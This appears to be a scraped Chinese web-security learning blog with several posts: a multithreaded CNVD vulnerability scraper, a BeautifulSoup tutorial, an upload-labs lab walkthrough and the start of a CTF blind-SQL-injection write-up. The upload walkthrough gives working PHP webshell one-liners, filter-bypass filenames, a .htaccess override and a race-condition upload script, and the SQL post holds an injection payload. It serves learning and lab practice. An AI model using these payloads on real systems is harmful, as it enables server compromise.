<h4 id="0x01-实战-爬取cnvd网的所有漏洞信息"><a href="#0x01-实战-爬取cnvd网的所有漏洞信息" class="headerlink" title="0x01 实战(爬取cnvd网的所有漏洞信息)"></a>0x01 实战(爬取cnvd网的所有漏洞信息)</h4><p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, threading, re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">n1, n2</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (n1, n2):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(<span class="string">&quot;https://www.cnvd.org.cn/webinfo/show/&#123;&#125;&quot;</span>.format(i))</span><br><span class="line">            <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">                isExist = re.findall(<span class="string">r&#x27;(&lt;title&gt;)([\u0000-\uFFFF]+)(&lt;/title&gt;)&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> (isExist[<span class="number">1</span>] != <span class="string">&quot;出错了....&quot;</span>):</span><br><span class="line">                    title = re.findall(<span class="string">r&#x27;(blkContainerSblk&quot;)([\u0000-\uFFFF]+)(&lt;h1&gt;)([\u0000-\uFFFF]+)(&lt;/h1&gt;)&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">                    content = re.findall(<span class="string">r&#x27;(blkContainerSblkCon clearfix)([\u0000-\uFFFF]+)(&lt;p&gt;)([\u0000-\uFFFF]+)(&lt;/p&gt;)(&lt;p&gt;\u53c2\u8003\u94fe\u63a5)&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">                    print(i, title[<span class="number">3</span>], content[<span class="number">3</span>])</span><br><span class="line">                    fp = open(<span class="string">&quot;res/&#123;&#125;.html&quot;</span>.format(i), <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                    fp.write(title[<span class="number">3</span>])</span><br><span class="line">                    fp.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    fp.write(content[<span class="number">3</span>])</span><br><span class="line">                    fp.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(r.status_code)</span><br><span class="line">                print(<span class="string">&quot;No&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(i, e)</span><br><span class="line">th = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    th.append(threading.Thread(target=run, args=((i<span class="number">-1</span>)*<span class="number">100</span>, i*<span class="number">100</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> th:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p>注释：</p>
<p>1.首先对网页进行源代码审计，寻找需要的目标信息的位置和特征</p>
<p>2.编写正则表达式，进行目标信息匹配</p>
<p>3.先进行requests.get()直接访问网页，注意网页的反爬措施</p>
<p>4.随后根据目标网页集合的特征，进行循环访问</p>
<p>5.整理代码</p>
<p>6.提高爬取速度，采用多线程进行爬取</p>
<p>7.汇总结果</p>
<p>最终结果将汇总在res/i.html中。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/Python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98-cnvd%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/" data-id="ckedn8msm0000fcty65ligdz7" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-python爬虫学习-BeautifulSoup" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0-BeautifulSoup/" class="article-date">
  <time datetime="2020-08-28T02:40:07.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0-BeautifulSoup/">python爬虫学习(BeautifulSoup)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天学习的内容是python爬虫，利用BeautifulSoup库。</p>
<h3 id="0x00-基本使用"><a href="#0x00-基本使用" class="headerlink" title="0x00 基本使用"></a>0x00 基本使用</h3><p>安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install beautifulsoup4</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<p>我们先定义一个简单的index.html文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;hello beautifulsoup&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;#&quot;&gt;123&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;p class&#x3D;&quot;hello&quot;&gt;hello&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>python引用BeautifulSoup：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">demo = </span><br><span class="line">soup = BeautifulSoup(open(<span class="string">&quot;index.html&quot;</span>), <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">print(soup.prettify())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出：</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;h1&gt;</span></span><br><span class="line"><span class="string">   hello beautifulsoup</span></span><br><span class="line"><span class="string">  &lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">   &lt;a href=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="string">    123</span></span><br><span class="line"><span class="string">   &lt;/a&gt;</span></span><br><span class="line"><span class="string">   &lt;p class=&quot;hello&quot;&gt;</span></span><br><span class="line"><span class="string">    hello</span></span><br><span class="line"><span class="string">   &lt;/p&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string"> &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>基本操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">soup.prettify()   <span class="comment"># 美化输出html/xml文档内容</span></span><br><span class="line">soup.a <span class="comment"># 获取html中的第一个a标签</span></span><br><span class="line">soup.title <span class="comment"># 获取html中的title标签</span></span><br><span class="line">soup.a[<span class="string">&#x27;href&#x27;</span>] <span class="comment"># 获取html的第一个a标签的href属性</span></span><br><span class="line">soup.p[<span class="string">&#x27;class&#x27;</span>] <span class="comment"># 获取html的第一个p标签的class属性</span></span><br><span class="line">soup.name <span class="comment"># u&#x27;[document]&#x27;</span></span><br><span class="line">soup.a.name <span class="comment"># &#x27;a&#x27;</span></span><br><span class="line">soup.a.contents <span class="comment"># 将html中第一个a标签的所有子节点以列表的方式输出</span></span><br><span class="line">soup.contents[<span class="number">0</span>] <span class="comment"># 获取html标签所有子节点列表中的第一个元素</span></span><br><span class="line">soup.a.contents[<span class="number">0</span>].contents <span class="comment"># AttributeError,字符串没有.contents属性，因为字符串没有子节点</span></span><br><span class="line">soup.a.parent <span class="comment"># 通过.parent属性来获取某个元素的父节点</span></span><br><span class="line">soup.title.string.parent <span class="comment"># &#x27;title&#x27; 文档title的字符串的父亲结点存在，为&lt;title&gt;标签</span></span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">	<span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		print(parent)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print(parent.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过元素的.parents属性递归得到元素的所有父亲节点</span></span><br><span class="line">soup.a.next_sibling </span><br><span class="line">soup.a.previous_sibling  <span class="comment"># 使用.next_sibling和previous_sibling查询兄弟节点</span></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_siblings:</span><br><span class="line">    print(repr(sibling))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_siblings:</span><br><span class="line">    print(repr(sibling))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 通过.next_siblings和.previous_siblings属性对当前节点的兄弟节点迭代输出</span></span><br></pre></td></tr></table></figure>

<h3 id="0x01-进阶用法"><a href="#0x01-进阶用法" class="headerlink" title="0x01 进阶用法"></a>0x01 进阶用法</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>找出所有以b开头的标签(<body>,<b>)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.compile(<span class="string">&quot;^b&quot;</span>)):</span><br><span class="line">    print(tag.name)</span><br></pre></td></tr></table></figure>

<h4 id="find-all-函数"><a href="#find-all-函数" class="headerlink" title="find_all()函数"></a>find_all()函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">函数原型：find_all( name, attrs, recursive, text, **kwargs)</span><br><span class="line">常见示例：</span><br><span class="line">soup.find_all(<span class="string">&#x27;a&#x27;</span>) <span class="comment"># 获取html中的所有a标签</span></span><br><span class="line">soup.find_all(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="comment"># 获取html中的所有a标签和b标签</span></span><br><span class="line">soup.find_all(href=<span class="string">&quot;#&quot;</span>) <span class="comment"># 获取html中所有href属性为&quot;#&quot;的标签</span></span><br><span class="line">soup.find_all(id=<span class="literal">True</span>) <span class="comment"># 获取html中所有包含id属性的标签</span></span><br><span class="line">soup.find_all(<span class="string">&#x27;a&#x27;</span>, limit=<span class="number">2</span>) <span class="comment"># 获取html中所有的a标签，返回最多2个</span></span><br><span class="line">soup.find_all(<span class="string">&#x27;title&#x27;</span>, recursive=<span class="literal">False</span>) <span class="comment"># 搜索title标签的直接子节点(recursive默认为True, 将搜索该标签的所有子孙节点)</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0-BeautifulSoup/" data-id="ckedn8mtd000pfcty4m5v4b3o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传学习" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-08-28T02:39:16.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/">文件上传学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近开始进行正式的安全培训了，按照大佬的学习进度安排，今天先学习文件上传upload-labs。  </p>
<h4 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h4><p>最简单的情况，客户端检查文件后缀，后端无任何过滤，直接随便提交一个png文件，burp抓包修改文件名为1.php，文件内容为<code>&lt;?php eval($_POST[&#39;123&#39;]); ?&gt;</code>即可拿到shell.</p>
<h4 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h4><p>这回是后端检查文件类型，但是没有过滤文件后缀，仍然使用上一题的payload拿到shell。</p>
<h4 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h4><p>查看源码发现过滤了.php .jsp .asp .aspx 上一题的payload无法使用了，这里通过特殊可解析文件后缀名phtml绕过即可。提交文件名为3.phtml的文件，文件内容同上，即可拿shell。</p>
<h4 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h4><p>这次phtml也被过滤了，这里考虑通过上传.htaccess文件，使得服务器可以解析自定义后缀的文件为php可执行文件，达到getshell的目的。</p>
<p>首先上传文件.htaccess，文件内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;aaa&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>这样.aaa文件将会被解析成php可执行文件。此时我们上传4.aaa文件，文件内容<code>&lt;?php eval($_POST[&#39;123&#39;]); ?&gt;</code>，即可getshell。</p>
<h4 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h4><p>查看源码发现没有将文件名转换为小写的操作了，故大小写绕过，上传名为1.phTml的文件，文件内容同上，即可getshell。</p>
<h4 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h4><p>由于Windows系统的特性，文件名最后的空格，点号在存储的时候会被删去，查看源码发现没有过滤空格的这种情况，故通过空格绕过过滤。上传文件名为”1.phtml “的文件，文件内容同上，即可getshell。</p>
<h4 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h4><p>同理，使用文件名后添加点号<code>.</code>绕过过滤，上传名为”1.phtml.”的文件，文件内容同上，即可gets hell。</p>
<h4 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h4><p>通过::$DATA绕过。原理：Windows文件流特性。</p>
<p>在NTFS文件系统下，每个文件都可以存在多个数据流，也就是说，除了主文件流之外，还可以有很多非主文件流寄宿在主文件流中。虽然我们无法看到数据流文件，但是它是真实存在于我们系统之中的。</p>
<p>格式如下：</p>
<p><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</code></p>
<p>例如该payload,<code>1.php:jpg</code>，流类型以$开头，默认流类型为data，故该payload的完整形式为<code>1.php:jpg:$data</code>。这时查看上传目录发现多了一个1.php文件。</p>
<p>文件内容在数据流文件中，我们当初上传的就是一个文件流文件，之所以会顺带生成1.php，是因为它没有找到自己的宿主文件，所以才创建了一个。</p>
<p>故构造如下文件名：<code>8.php::$data</code>，文件内容同上，即可getshell。</p>
<h4 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h4><p>查看源码发现多了首尾去空操作，并且是先删除了文件名最后的点再首尾去空。这时利用逻辑漏洞绕过过滤。构造文件名：<code>9.php. .</code>(上传文件名后加点+空格+点)，文件内容同上，即可getshell。</p>
<h4 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h4><p>查看源码发现这次是进行特定字符替换，将黑名单中的字符串替换成空。这里通过双写php绕过。上传文件名为<code>10.pphphp</code>的文件，文件内容同上，即可getshell。</p>
<h4 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h4><p>查看源码发现这次是白名单过滤。抓包发现多了一个save_path参数。再观察文件上传后的路径构造方式，发现每次都会上传到save_path目录下的一个随机文件名上。由于只能上传jpg,png,gif文件，故没法再通过文件名绕过了。这里可以考虑%00截断。</p>
<p>payload：<code>../upload/11.php%00</code></p>
<p>同时上传1.jpg文件，文件内容<?php eval($_POST['123']); ?>，随后访问11.php，发现可以getshell。</p>
<h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h4><p>题目内容几乎和pass-11一样，只是upload路径改成了post方式传入，这里不能再通过%00，因为get方式传入%00会被web服务器进行解码成NULL，而post方式%00不会被解码，需要手动传入0x00。故通过修改二进制码来完成。在save_path栏输入”../upload/12.php “，然后进入hex部分，对应到刚刚输入的内容最后一个空格，为20，将他修改为00，随后上传一个名为12.jpg的文件，文件内容<code>&lt;?php eval($_POST[&#39;123&#39;]); ?&gt;</code>，即可getshell。</p>
<h4 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h4><p>查看源码发现是检查文件头，这里通过文件头部加入GIF89a绕过。上传名为13.php的文件，文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;123&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>即可绕过检查，成功getshell。</p>
<h4 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h4><p>查看源码发现使用getimagesize函数判断文件类型，同理检查文件头，故绕过方法同上。</p>
<blockquote>
<p>不过有一点需要注意，pass13和pass14两个题目上传的一句话其实是无法解析的，除非有文件包含问题或者是解析漏洞，但这里题目要求上传图片马，所以这样操作即可。</p>
</blockquote>
<h4 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h4><p>查看源码发现使用exif_imagetype函数检查图像类型，实际上是读取图像的第一个字节并检查其签名。同理可以通过文件头GIF89a绕过。方法同上。</p>
<h4 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h4><p>查看源码发现这次进行了后缀名判断，content-type判断以及通过imagecreatefromgif(imagecreatefrompng/imagecreatefromjpg)等函数判断是否为gif(png/jpg)图片，最后进行二次渲染。这里gif和png绕过方法不同，我们先将一句话插入到gif的末尾，上传，再二进制格式打开上传的图片，发现我们插入的一句话消失了，说明这里不能将其插入在末尾。那么怎么插入才不会被删除呢？我们观察二次渲染前后没有改动的内容部分，在这里面插入我们的一句话，就可以绕过二次渲染了。png文件和jpg文件的修改方式不同(png文件插入后还需修改循环冗余码，jpg文件暂时不知道)</p>
<h4 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h4><p>查看源码，发现文件上传后会通过rename修改名称，然后unlink删除，这里可以通过条件竞争，不断上传我们的文件，在删除前访问webshell。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">lists</span>):</span></span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;&quot;POST /upload/Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.43.170</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://192.168.43.170/upload-labs/Pass-17/index.php</span></span><br><span class="line"><span class="string">Cookie: pass=17</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Length: 351</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&#x27;123&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string">-----------------------------6696274297634</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------6696274297634--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://192.168.43.170/upload/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    print(str(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">20</span>)</span><br><span class="line">pool.map(upload, range(<span class="number">10000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<h4 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h4><p>查看源码发现代码进行了校验后缀名、移动随后重命名的操作，这里依然通过条件竞争，无限高频上传文件，导致来不及重命名，从而成功访问webshell。</p>
<p>上传文件名为18.php.7z的文件，文件内容最下方为一句话木马，<code>&lt;?php fputs(fopen(&#39;18.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;x&quot;])?&gt;&#39;); ?&gt;</code>，这样只要文件被成功解析成PHP，就会生成18.php木马文件。</p>
<p>随后使用burp的intruder模块无限重放数据包，随后疯狂访问<code>http://127.0.0.1/upload-labs/upload/18.php.7z</code>(或者使用python脚本)，直到出现内容，说明竞争成功。</p>
<h4 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h4><p>move_uploaded_file() %00截断，查看源码发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用%00截断绕过。</p>
<h4 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h4><p>数组绕过。查看源码发现文件名$file_name通过了<code>reset($file).&#39;.&#39;.$file[count($file)-1]</code>进行处理。且如果上传数组则会跳过<code>$file=explode(&#39;.&#39;, strtolower($file));</code></p>
<p>最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让$file为数组。</p>
<p>我们上传文件名为20.php的文件，文件内容为一句话木马，随后save_name[0]设置为”20.php/“,save_name[2]设置为jpg，即可成功上传webshell。</p>
<h4 id="文件上传思维导图"><a href="#文件上传思维导图" class="headerlink" title="文件上传思维导图"></a>文件上传思维导图</h4><img src="/assets/img/20200629学习总结/20200629学习总结1.jpg"/>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" data-id="ckedn8mtn001gfctybn822ysi" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-V1lu0实验室招新hard-sql" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/" class="article-date">
  <time datetime="2020-08-28T02:38:31.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/">V1lu0实验室招新hard_sql</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><p>1.sql盲注。    </p>
<p>2.sql语法中ascii()函数，substr()等字符串处理函数，case when分支结构等控制语句。   </p>
<p>3.python脚本编写能力。    </p>
<h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>首先拿到题目，给出了一个登录框，并提示后台做了过滤。这里依然先尝试万能密码。<code>admin&#39; or 1=1 #</code>发现登录成功，但是只有Login Success，没有其他任何信息。<code>admin&#39; #</code> 发现提示something wrong.</p>
<p>由于只提示有错误而不说明错误内容，这里无法使用联合查询或报错注入。故考虑盲注。   </p>
<p>给出第一步payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr(database(),1,1))) when &#39;104&#39; then pow(999,999) end %23pass&#x3D;123</span><br></pre></td></tr></table></figure>

